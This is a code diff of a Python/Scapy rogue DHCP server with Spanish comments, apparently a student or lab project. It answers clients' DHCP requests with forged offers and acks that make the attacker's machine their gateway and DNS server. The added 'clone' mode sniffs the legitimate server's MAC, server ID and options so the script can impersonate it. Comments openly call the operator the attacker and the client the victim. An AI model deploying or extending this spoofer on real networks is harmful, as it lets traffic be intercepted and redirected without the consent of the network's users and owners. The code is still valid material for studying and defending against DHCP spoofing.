@@ -1,56 +1,44 @@
-from scapy.all import Scapy_Exception, IP, Ether, UDP, BOOTP, DHCP, get_if_hwaddr, sniff, sendp, get_if_addr
+from scapy.all import (
+    Scapy_Exception,
+    IP, Ether, UDP, BOOTP, DHCP,
+    get_if_hwaddr, sniff, sendp, get_if_addr
+)
+
 import socket
 import argparse
 import time
 import re
+import random
 
 IFACE = "eth0"
 
 def get_broadcast(ipv4, prefix):
-    """
-    Calcula la dirección de broadcast de una subred IPv4.
+    if not isinstance(prefix, int) or not 0 <= prefix <= 32:
+        raise ValueError("El prefijo debe estar entre 0 y 32")
 
-    Parámetros:
-        ipv4 (str): IP de un host de la red, ej. "192.168.0.67".
-        prefix (int): longitud del prefijo (0 a 32).
-
-    Retorna:
-        str: dirección de broadcast en formato decimal con puntos.
-    """
-    if not isinstance(prefix, int) or not (0 <= prefix <= 32):
-        raise ValueError("El prefijo debe ser un entero entre 0 y 32.")
-
-    # IP (string) -> entero de 32 bits
     ip_int = 0
+
     for octeto in (int(x) for x in ipv4.split(".")):
         ip_int = (ip_int << 8) | octeto
 
-    # broadcast = IP OR (complemento de la máscara)
     mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
     broadcast_int = ip_int | (~mask_int & 0xFFFFFFFF)
 
-    # entero -> decimal con puntos
-    return ".".join(str((broadcast_int >> (8 * i)) & 0xFF) for i in range(3, -1, -1))
+    return ".".join(
+        str((broadcast_int >> (8 * i)) & 0xFF)
+        for i in range(3, -1, -1)
+    )
 
 def prefix_to_netmask(prefix):
-    """
-    Convierte un prefijo CIDR (por ejemplo, 24) en una máscara IPv4 (por ejemplo, 255.255.255.0).
+    if not isinstance(prefix, int) or not 0 <= prefix <= 32:
+        raise ValueError("El prefijo debe estar entre 0 y 32")
 
-    Parámetros:
-        prefix (int): longitud del prefijo (0 a 32).
-
-    Retorna:
-        str: máscara IPv4 en formato decimal.
-    """
-    # Validación de entrada
-    if not isinstance(prefix, int) or not (0 <= prefix <= 32):
-        raise ValueError("El prefijo debe ser un entero entre 0 y 32.")
-
-    # Crear máscara como entero de 32 bits
     mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
 
-    # Convertir a formato decimal con puntos
-    return ".".join(str((mask_int >> (8 * i)) & 0xFF) for i in range(3, -1, -1))
+    return ".".join(
+        str((mask_int >> (8 * i)) & 0xFF)
+        for i in range(3, -1, -1)
+    )
 
 
 def get_my_mac(interface):
@@ -68,6 +56,7 @@ def crear_args():
     p.add_argument("-i", "--iface", default= IFACE)
     p.add_argument("-d", "--duration", type=int, default=10, help="segundos; 0=infinito")
     p.add_argument("-l", "--lease", type=int, default= 86400, help="Segundos que dura el prestamo")
+    p.add_argument("-c", "--clone", action="store_true", help="CLona al server  dhcp mediante sniffing")
     return p.parse_args()
 
 def validate_ip(red):
@@ -124,97 +113,235 @@ def validate_ip(red):
 
     return (ipv4, mascara)
 
-def armar_respuesta(pkt, tipo, mi_ip, ip_offer, mascara, lease, mi_mac, interface):
-    eth_field = Ether(src= mi_mac, dst="ff:ff:ff:ff:ff:ff")
-    ip_field = IP(src=mi_ip, dst="255.255.255.255")
+def crear_estado(interface):
+    return {
+        "clone": False,
+
+        # ─── LO TUYO (atacante) — se llena acá y NADIE lo pisa ───
+        "mi_ip":            get_my_ip(interface),   # tu IP real
+        "mi_mac":           get_my_mac(interface),  # tu MAC real
+        "ip_ofrecida":      None,                   # IP que repartís (la cargás de -r)
+        "mascara_ofrecida": None,                   # máscara que repartís
+        "lease":            None,                   # duración del préstamo (-l)
+        "interface":        None,                   # por dónde mandás
+        "mi_xid":           random.randint(1, 0xFFFFFFFF), # mi xid generado al azar
+
+        # ─── LO DEL SERVER (capturado en modo clone) — lo llena get_data ───
+        "server_id":        None,                   # IP del server legítimo
+        "server_mac":     None,                     # (MAC del server)
+        "xid":              None,                   # xid del Offer capturado (sirve en Fase 3)
+        "yiaddr":           None,                   # IP que el server ofreció
+        "opciones":         {},                     # foto de las opciones del server
+    }
+
+def armar_respuesta(pkt, tipo, estado):
+    src_mac = estado["server_mac"] if estado["clone"] else estado["mi_mac"]
+    id_ip = estado["server_id"] if estado["clone"] else estado["mi_ip"]
+
+
+    eth_field = Ether(src= src_mac, dst="ff:ff:ff:ff:ff:ff")
+    ip_field = IP(src=estado["mi_ip"], dst="255.255.255.255")
     udp_field = UDP(sport=67, dport=68)
     mac_victima = pkt[Ether].src
     bootp_field = BOOTP(
         op= 2, # 1 request y 2 reply
         xid = pkt[BOOTP].xid,
-        yiaddr = ip_offer,
-        siaddr = mi_ip,
+        yiaddr = estado["ip_ofrecida"],
+        siaddr = id_ip,
         chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'\x00'*10
     )
     message_value = "offer" if tipo == 1 else "ack"
     dhcp_field = DHCP(
         options = [
             ("message-type", message_value),
-            ("server_id", mi_ip),
-            ("lease_time", lease),
+            ("server_id", id_ip),
+            ("lease_time", estado["lease"]),
             ("renewal_time", 43200), # dsp usar args para esto
             ("rebinding_time", 75600), # lo mismo aca
-            ("subnet_mask", prefix_to_netmask(mascara)),
-            ("broadcast_address", get_broadcast(ip_offer, mascara)),
-            ("router", mi_ip),
-            ("name_server", mi_ip),
+            ("subnet_mask", prefix_to_netmask(estado["mascara_ofrecida"])),
+            ("broadcast_address", get_broadcast(estado["ip_ofrecida"], estado["mascara_ofrecida"])),
+            ("router", estado["mi_ip"]),
+            ("name_server", estado["mi_ip"]),
             "end"
         ]
     )
 
-    sendp(eth_field/ip_field/udp_field/bootp_field/dhcp_field, iface=interface, verbose=False)
+    sendp(eth_field/ip_field/udp_field/bootp_field/dhcp_field, iface=estado["interface"], verbose=False)
 
-def procesar_pkt(pkt, mi_ip, ip_offer, mascara, lease, mi_mac, interface):
-    if IP in pkt:
-        ip_data = pkt[IP]
-        if ip_data.src == mi_ip:
-            return
+def procesar_pkt(pkt, estado):   # modo INGENUO: escucha al cliente y responde
+    if IP in pkt and pkt[IP].src == estado["mi_ip"]:
+        return                   # ignoro mis propios paquetes (no me auto-respondo)
+    if DHCP not in pkt: return
+    opciones = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
+    tipo = opciones.get("message-type")
+    if tipo is None: return
+    if tipo in (1, 3):           # 1=discover, 3=request → el cliente pide
+        armar_respuesta(pkt, tipo, estado)
 
-    if DHCP not in pkt:
-        return
+def sniff_netword(args, resultado):
 
-    dhcp_data = pkt[DHCP].options
-    for opt in dhcp_data:
-    if isinstance(opt, tuple) and opt[0] == 'message-type':
-        dora = opt[1]
-        if dora in (1, 3):
-            armar_respuesta(pkt, dora, mi_ip, ip_offer, mascara, lease, mi_mac, interface)
-            return
-
-    return
-
-def sniff_netword(args, resultado ):
-    ip_offer, mascara = resultado
     interface = args.iface
     duration = args.duration
-    lease = args.lease
-
-    mi_ip = get_my_ip(interface)
-    mi_mac = get_my_mac(interface)
-
-    timeout = duration if duration > 0 else None
 
     try:
+        estado = crear_estado(interface)
+        estado["ip_ofrecida"], estado["mascara_ofrecida"] = resultado
+        estado["lease"] = args.lease
+        estado["interface"] = interface
+
+        timeout = duration if duration > 0 else None
+
+        print("[+] Interfaz:", interface)
+        print("[+] IP:", estado["mi_ip"])
+        print("[+] MAC:", estado["mi_mac"])
+
         sniff(
-              filter="udp and (port 67 or port 68)",
-              prn=lambda pkt: procesar_pkt(pkt, mi_ip, ip_offer, mascara, lease, mi_mac, interface),
-              store=False,
-              iface=interface,
-              timeout=timeout
+            filter="udp and (port 67 or port 68)",
+            prn=lambda pkt: procesar_pkt(
+                pkt, estado
+            ),
+            store=False,
+            iface=interface,
+            timeout=timeout
         )
+
     except KeyboardInterrupt:
-        print("cerrando programa...")
+        print("Cerrando programa...")
+
     except PermissionError:
-        print("Error: Permisos insuficientes. Usa el script con sudo")
+        print("Error: permisos insuficientes")
+
     except Scapy_Exception as e:
-        print(f"Error de Scapy: {e}")
+        print("Error de Scapy:", e)
+
     except OSError as e:
-        print(f"Error de red: {e}")
+        print("Error de red:", e)
+
     except Exception as e:
-        print(f"Error global: {e}")
+        print("Error global:", e)
 
+def get_data(pkt, estado):
+    # Guardas de capa: si falta Ether/BOOTP/DHCP, no es lo que buscamos → salgo
+    if Ether not in pkt: return
+    if BOOTP not in pkt: return
+    if DHCP  not in pkt: return
+
+    # Desarmo la lista de opciones DHCP a un dict {nombre: valor} para leerlas cómodo
+    opciones = {}
+    for opt in pkt[DHCP].options:
+        if isinstance(opt, tuple):      # las opciones reales son tuplas; "end"/"pad" no
+            nombre, valor = opt
+            opciones[nombre] = valor
+
+    # --- Guardo lo capturado del SERVER en estado ---
+    estado["xid"]      = pkt[BOOTP].xid       # nº de transacción del Offer
+    estado["yiaddr"]   = pkt[BOOTP].yiaddr    # IP que el server ofreció
+    estado["opciones"] = opciones             # foto de lo que advertisó el server
+
+    estado["server_mac"] = pkt[Ether].src
+
+    estado["server_id"] = opciones.get("server_id", None)
+
+    estado["opciones"]["router"]      = opciones.get("router", None)
+    estado["opciones"]["name_server"] = opciones.get("name_server", None)
+    # ℹ️ esto es la foto de lo del server (está BIEN que sean datos del server acá).
+
+    # Print de confirmación (los 5 campos del criterio de la 2.1)
+    print("[+] Paquete DHCP analizado")
+    print("XID:", estado["xid"])
+    print("IP ofrecida:", estado["yiaddr"])
+    print("Server ID:", estado["server_id"])
+    print("MAC origen:", pkt[Ether].src)
+    print("Router: ", estado["opciones"]["router"])
+    print("Name server: ", estado["opciones"]["name_server"])
+    
+def send_discover(estado):
+    eth_field = Ether(src= estado["mi_mac"], dst="ff:ff:ff:ff:ff:ff")
+    ip_field = IP(src="0.0.0.0", dst="255.255.255.255")
+    udp_field = UDP(sport=68, dport=67)
+    mac_victima = estado["mi_mac"]
+    bootp_field = BOOTP(
+        op= 1, # 1 request y 2 reply
+        xid = estado["mi_xid"],
+        yiaddr = "0.0.0.0",
+        siaddr = "0.0.0.0",
+        chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'\x00'*10
+    )
+    dhcp_field = DHCP(
+    options = [
+        ("message-type", "discover"),
+        ("param_req_list", [1, 3, 6]),
+        "end"
+        ]
+    )
+    sendp(eth_field/ip_field/udp_field/bootp_field/dhcp_field, iface=estado["interface"], verbose=False)
+    
+    
+def look_offer(pkt, estado):     # modo CLONE (hoy): escucha al SERVER y captura
+    if Ether not in pkt: return
+    if IP    not in pkt: return
+    if UDP   not in pkt: return
+    if BOOTP not in pkt: return
+    if DHCP  not in pkt: return
+    opciones = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
+    tipo = opciones.get("message-type")
+    if tipo not in (2, 5):       # 2=offer, 5=ack → solo del server
+        return
+    if estado["mi_xid"] != pkt[BOOTP].xid: # valido q la respuesta sea a mi
+        return
+    get_data(pkt, estado)        
+
+    
 def main():
-    args = crear_args()
-    red = args.red
 
-    resultado = validate_ip(red)
+    args = crear_args()
+
+    resultado = validate_ip(args.red)
+
     if resultado == -1:
         return
 
+    if args.clone:
+        print("[+] Modo de inspección DHCP")
+
+        interface = args.iface
+
+        try:
+            estado = crear_estado(interface)
+            estado["ip_ofrecida"], estado["mascara_ofrecida"] = resultado
+            estado["lease"] = args.lease
+            estado["interface"] = interface
+            estado["clone"] = True
+
+            timeout = (
+                args.duration
+                if args.duration > 0
+                else None
+            )
+
+            sniff(
+                filter="udp and (port 67 or port 68)",
+                prn=lambda pkt: look_offer(
+                    pkt, estado
+                ),
+                store=False,
+                iface=interface,
+                timeout=timeout,
+                started_callback= lambda: send_discover(estado)
+            )
+
+        except KeyboardInterrupt:
+            print("Cerrando programa...")
+
+        except Scapy_Exception as e:
+            print("Error de Scapy:", e)
+
+        except OSError as e:
+            print("Error de red:", e)
+
+        return
 
     sniff_netword(args, resultado)
-
-
 
 
 if __name__ == "__main__":
